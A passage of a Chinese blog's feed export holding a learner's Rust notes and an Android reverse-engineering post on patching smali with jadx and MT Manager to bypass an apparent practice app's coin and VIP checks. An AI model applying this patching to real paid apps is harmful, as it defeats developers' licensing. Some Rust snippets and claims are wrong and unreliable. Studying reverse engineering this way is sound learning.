&#123;s&#125; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>都是可以正常打印出<code>Hello world</code>的。</p><p>这里提一嘴rust的编译，非常的简单，在终端源码目录下运行，即可得到一个可执行文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rustc main.rs</span><br></pre></td></tr></table></figure><h3 id="变量与可变性"><a href="#变量与可变性" class="headerlink" title="变量与可变性"></a>变量与可变性</h3><p>！！！Rust的变量是默认不可变的 这就非常的反直觉，不过这会使得程序变得更加安全，变量用let来声明</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">x</span>=<span class="number">5</span></span><br><span class="line"></span><br><span class="line"> x=<span class="number">6</span></span><br><span class="line"></span><br><span class="line"> x=x+<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231012210247.png"></p><p>下面两条试图改变变量x的语句都是不合法的，要想使变量真正可变，需要在创建时加上一个mut （mutable，可变的）</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> =<span class="number">5</span>;</span><br><span class="line">x=<span class="number">6</span>;</span><br><span class="line">x=x+<span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>常量总是不可变的，使用const而不是let声明</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> CON: <span class="type">u32</span>=<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>在这条语句中，const表示声明一个常量，CON是名称，u32是常量的类型即无符号32位整数，常量必须是在编译阶段已经确定的</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> CON： <span class="type">u32</span>=<span class="number">3</span>+<span class="number">3</span>+<span class="number">3</span> ；   <span class="comment">//编译通过</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> CON： <span class="type">u32</span>=x+<span class="number">1</span>；      <span class="comment">//编译不通过</span></span><br></pre></td></tr></table></figure><p>常量的命名规则，单词全大写并且用_连接。</p><h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h3><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231012211348.png"></p><h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><p>和c语言的结构体很像，可以存储不同类型的值，引用方面比较奇怪。</p><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231013015009.png"></p><p>元组的引用方法</p><p>方法一</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">tup</span>=(<span class="number">500</span>,<span class="number">6.4</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">let</span> (_x,y,_z)=tup;   <span class="comment">//这一步把元组里的三个数据分别赋值给了x，y，z,在x前加上_告诉编译器x是有意不使用的，这样就不会发出warning</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y=&#123;y&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//y=6.4</span></span><br></pre></td></tr></table></figure><p>方法二 索引</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">tup</span>=(<span class="number">500</span>,<span class="number">6.4</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y=&#123;&#125;&quot;</span>,tup.<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//y=500  索引下标从零开始</span></span><br></pre></td></tr></table></figure><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231013020329.png"></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">a</span>:[<span class="type">i32</span>;<span class="number">5</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;; <span class="comment">//a是名字，[]里是类型 有符号32位整数 分号后面的5表示长度为5</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span>=&#123;<span class="number">3</span>;<span class="number">5</span>&#125;<span class="comment">//申请一个长度为5全部填充3的数组</span></span><br></pre></td></tr></table></figure><p>输出数组，通过这个输出可以看出print之后是默认换行的</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span>:[<span class="type">i32</span>; <span class="number">5</span>]= [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> a &#123;</span><br><span class="line">       <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>命名规则单词全部小写，函数的声明可以在程序的任何位置</p><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231013021625.png"></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="title function_ invoke__">aaa</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">aaa</span>()&#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//xxx</span></span><br></pre></td></tr></table></figure><p>含有参数的函数</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="title function_ invoke__">aaa</span>(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">aaa</span>(x:<span class="type">i32</span>)&#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x=&#123;&#125;&quot;</span>,x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//x=5</span></span><br></pre></td></tr></table></figure><p>含有返回值的函数，返回值需要显示地表示出来</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span>:<span class="type">i32</span>=<span class="title function_ invoke__">aaa</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;aaa return &#123;x&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">aaa</span>(x:<span class="type">i32</span>)<span class="punctuation">-&gt;</span><span class="type">i32</span>&#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x=&#123;&#125;&quot;</span>,x);</span><br><span class="line">    <span class="number">6</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//x=5</span></span><br><span class="line"><span class="comment">//aaa return 6</span></span><br></pre></td></tr></table></figure><p>对，我没有写错，最后一行6的后面就是没有分号，我们可以这样理解：最后一行<code>6</code>是一个常量<strong>表达式</strong>，它的值等于整数<code>6</code>。在这个函数中，它被用作返回值。</p><ul><li>表达式：先这么记，代码没有分号则是一个表达式，表达式会返回值，可以用来赋值</li><li>语句 <code>let 1:i32=5</code>; 这就是一个语句，无返回值。</li></ul><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231013023912.png"></p><p>需要注意的是if后面的判断表达式返回值必须是bool值。</p><h4 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h4><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231013024308.png"></p><p>就然还有loop，我只在汇编中接触过loop，可以从loop中返回一个值。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">a</span>:<span class="type">i32</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span>=<span class="keyword">loop</span>&#123;</span><br><span class="line">        a+=<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> a&gt;<span class="number">3</span>&#123;</span><br><span class="line">            <span class="keyword">break</span> a;  <span class="comment">//跳出循环返回a</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x=&#123;x&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hello</span></span><br><span class="line"><span class="comment">//hello</span></span><br><span class="line"><span class="comment">//hello</span></span><br><span class="line"><span class="comment">//hello</span></span><br><span class="line"><span class="comment">//x=4</span></span><br></pre></td></tr></table></figure><p>loop中break和continue的用法和c语言类似。</p><h4 id="嵌套循环"><a href="#嵌套循环" class="headerlink" title="嵌套循环"></a>嵌套循环</h4><p>作用是精确的退出多层循环。</p><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231013030215.png"></p><h4 id="while和for循环"><a href="#while和for循环" class="headerlink" title="while和for循环"></a>while和for循环</h4><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231013030332.png"></p><h3 id="所有权概念"><a href="#所有权概念" class="headerlink" title="所有权概念"></a>所有权概念</h3><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231013124018.png" alt=" "></p><h3 id="这里存在疑问！！！！！！！！！！！！！！！！！！"><a href="#这里存在疑问！！！！！！！！！！！！！！！！！！" class="headerlink" title="这里存在疑问！！！！！！！！！！！！！！！！！！"></a>这里存在疑问！！！！！！！！！！！！！！！！！！</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span>=<span class="number">123</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span>=x;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x=&#123;&#125;&quot;</span>,x);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y=&#123;&#125;&quot;</span>,y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//x=123</span></span><br><span class="line"><span class="comment">//y=123</span></span><br></pre></td></tr></table></figure><p>按照对所有权的介绍，打印x的时候x应该已经弃用了。</p><h3 id="变量作用域与变量隐藏"><a href="#变量作用域与变量隐藏" class="headerlink" title="变量作用域与变量隐藏"></a>变量作用域与变量隐藏</h3><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231013165838.png"></p><p>**{}**是作用域，</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span>=<span class="number">122</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span>=x+<span class="number">1</span>;   <span class="comment">//变量隐藏</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">x</span>=<span class="number">124</span>;              <span class="comment">//x的作用域</span></span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;x=&#123;&#125;&quot;</span>,x);     <span class="comment">//x的作用域</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x=&#123;&#125;&quot;</span>,x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//x=124</span></span><br><span class="line"><span class="comment">//x=123</span></span><br></pre></td></tr></table></figure><h3 id="引用与借用"><a href="#引用与借用" class="headerlink" title="引用与借用"></a>引用与借用</h3><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231013175951.png"></p><p>s和s1的关系如下图所示。&amp;是引用符号</p><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231013180621.png"></p><p>首先s不是指向hello字符串的，所以不存在与s1竞争所有权的问题，其次离开s的作用域后s丢弃，s1以及hello字符串不受影响。</p><h3 id="rustlings记录"><a href="#rustlings记录" class="headerlink" title="rustlings记录"></a>rustlings记录</h3><h4 id="关于if"><a href="#关于if" class="headerlink" title="关于if"></a>关于if</h4><p><img src="/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231013205305.png"></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">bigger</span>(a: <span class="type">i32</span>, b: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> a&gt;b&#123;</span><br><span class="line">    a</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> a&lt;b&#123;</span><br><span class="line">    b</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//note: `if` expressions without `else` evaluate to `()`</span></span><br><span class="line"><span class="comment">//help: consider adding an `else` block that evaluates to the expected type</span></span><br></pre></td></tr></table></figure><p><strong>if语句必须跟一个else语句</strong></p><h4 id="slice-切片"><a href="#slice-切片" class="headerlink" title="slice 切片"></a>slice 切片</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">slice_out_of_array</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">nice_slice</span> = &amp;a[<span class="number">1</span>..<span class="number">4</span>];  <span class="comment">//从下标 1 至下标 4-1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert_eq!</span>([<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], nice_slice)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="clone和借用"><a href="#clone和借用" class="headerlink" title="clone和借用"></a>clone和借用</h3><p><strong>clone</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">s2</span> = s1.<span class="title function_ invoke__">clone</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;s1: &#123;&#125;&quot;</span>, s1); <span class="comment">// 此处仍然可以使用s1</span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;s2: &#123;&#125;&quot;</span>, s2); <span class="comment">// 输出 &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure><p><code>clone</code>是用于创建数据的完全拷贝，包括堆上的数据。它会复制原始数据，生成一个新的独立副本，两者之间没有关联。<code>clone</code>适用于需要独立拥有数据的情况，确保对数据的修改不会影响原始数据。</p><p><strong>借用</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">print_length</span>(s: &amp;<span class="type">str</span>) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Length: &#123;&#125;&quot;</span>, s.<span class="title function_ invoke__">len</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_length</span>(&amp;s); <span class="comment">// 传递s的引用给函数，不会转移所有权</span></span><br></pre></td></tr></table></figure><p>借用(<code>borrowing</code>)则是一种不拥有数据但可以临时访问的机制。通过借用，可以将数据的引用传递给其他代码，而无需转移所有权。在使用借用时，原始数据保持不变，可以有多个不可变引用同时存在，但只能有一个可变引用。这样可以在编译时避免数据竞争和并发问题。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;听闻rust大名已久，正巧赶上2023 秋冬季开源操作系统训练营，就来学习啦。&lt;/p&gt;
&lt;figure class=&quot;highlight rust&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;main&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;println!&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;Hello,world!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="language" scheme="http://example.com/tags/language/"/>
    
    <category term="rust" scheme="http://example.com/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>Android学习篇（二）</title>
    <link href="http://example.com/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://example.com/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2023-10-15T11:15:42.000Z</published>
    <updated>2023-10-15T11:15:42.691Z</updated>
    
    <content type="html"><![CDATA[<p>主要学习smali，通过实际上手修改smali代码加深理解。</p><span id="more"></span><h3 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h3><p>JVM是Java虚拟机，运行Java字节码程序。</p><h3 id="Dalvik"><a href="#Dalvik" class="headerlink" title="Dalvik"></a>Dalvik</h3><p>Dalvik是Google专门为Android设计的一个虚拟机，Dalvik有专属的文件执行格式dex(Dalvik executable)。</p><h3 id="smali及其语法"><a href="#smali及其语法" class="headerlink" title="smali及其语法"></a>smali及其语法</h3><p>smali是Dalvik的寄存器语言，smali代码是dex反编译而来的。可以把Dalvik理解成x86，那么smali就是x86汇编。在反编译的时候不能修改该java代码，只能修改smali代码。</p><h3 id="jadx"><a href="#jadx" class="headerlink" title="jadx"></a>jadx</h3><p>分析apk的工具，可以理解为分析java的ida。</p><h3 id="vip终结"><a href="#vip终结" class="headerlink" title="vip终结"></a>vip终结</h3><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015181533.png"></p><p>任务是一键三连，但是他弹窗提醒需要充值大会员，直接在jadx中使用搜索功能，搜索大会员。直接定位到这段代码。<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015181807.png"></p><p>首先他会判断我们的硬币数量，在判断我们是不是vip，解决方法</p><ol><li>进入这个方法之后直接goto到 ChallengeSecond challengeSecond2 &#x3D; challengeSecond;</li><li>修改硬币和isvip的判断</li><li>修改寄存器中的值</li></ol><h4 id="通过修改判断"><a href="#通过修改判断" class="headerlink" title="通过修改判断"></a>通过修改判断</h4><p>jadx不支持修改代码，要使用mt管理器，提取apk文件并定位，反编译dex文件，搜索硬币，点击进入<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015182756.png"></p><p>if-ge全称greater equal(a&gt;&#x3D;b)，a大于或等于则跳，在mt里直接修改成if-le也就是小于等于即可，这样我们就会直接跳转到标签cood_15处，下面看isvip判断<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015183442.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">if</span>-eqz <span class="built_in">p0</span>, :cond_43</span><br></pre></td></tr></table></figure><p>如果p0等于0则跳转到cond_43处，而cood_43是提示请充值大会员的标签，所以我们可以选择直接注释掉这段代码，这样就不会发生跳转，或者讲逻辑改成不等于0.</p><p>保存并重新安装即可。</p><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015184145.png"></p><h4 id="通过修改寄存器的值"><a href="#通过修改寄存器的值" class="headerlink" title="通过修改寄存器的值"></a>通过修改寄存器的值</h4><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015185249.png"></p><p>p0是我们的硬币数量，v0被赋成了10，我们只需要将 const&#x2F;16 v0, 0xa改成 const&#x2F;16 v0, 0x0即可。下面跳转到isvip判断，长按点击跳转<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015185439.png"></p><p>逻辑是这样的<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015185509.png"></p><p>也就是返回0即假，直接const&#x2F;4 v0,0x1即可</p><h4 id="强制跳转"><a href="#强制跳转" class="headerlink" title="强制跳转"></a>强制跳转</h4><p>看一下goto的用法</p><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015185904.png"></p><p>直接照着葫芦画瓢</p><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015190518.png"></p><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015190620.png"></p><p>成功。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;主要学习smali，通过实际上手修改smali代码加深理解。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android逆向" scheme="http://example.com/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Android学习篇（一）</title>
    <link href="http://example.com/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://example.com/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2023-10-15T11:15:34.000Z</published>
    <updated>2023-10-15T11:15:34.692Z</updated>
    
